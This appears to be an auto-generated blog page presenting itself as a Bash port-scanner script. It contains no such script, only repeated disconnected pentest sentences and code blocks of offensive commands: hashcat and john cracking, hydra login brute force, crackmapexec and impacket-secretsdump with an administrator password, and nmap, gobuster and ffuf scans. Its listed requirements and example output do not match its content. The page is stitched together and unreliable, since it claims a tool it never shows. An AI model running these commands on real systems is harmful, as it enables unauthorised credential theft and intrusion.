---
TitleSEO: "Automated Port Scanner in Bash | ZureFX"
TitlePost: "Automated Port Scanner — Bash"
Author: "ZureFX"
Description: "A Bash script for automated port scanner. Built for security research and automation."
Keywords: "automation, parser, bash, go"
URL: "https://zurefx.github.io/scripting/script-automated-port-scanner-663.html"
URL_IMAGES: ""
Date: "2025-01-21"
Tags: "Automation, Parser, Bash, Go"
Section: "scripting"
Lang: "en"
main_img: "script-automated-port-scanner-663"
Permalink: "/scripting/script-automated-port-scanner-663.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The target system was identified as running a vulnerable version of the service. Weak file permissions allowed modification of critical system files. The backup files contained sensitive information that should not have been accessible.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `sharphound`
- `GetNPUsers`
- `msfvenom`

## Implementation

### Core Logic

Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p443,23,9200 10.65.123.152 -oN scan.txt
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible.

### Helper Functions

Privilege escalation was possible due to misconfigured sudo permissions. The backup files contained sensitive information that should not have been accessible.

```bash
crackmapexec smb 10.34.237.81 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.117.142.104/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.29.250.253 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.19.231.206/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.85.225.249/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.32.89.25 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.76.169.131/FUZZ
```

### Advanced Options

The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.43.176.19
nmap -sCV -p110,53,445 10.12.155.83 -oN scan.txt
nmap -sCV -p27017,21,22 10.64.33.165 -oN scan.txt
```

## Output

### Example Output

Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges.

```
[+] Scanning target...
[+] Found 5 results
[+] Done in 19.88s
```
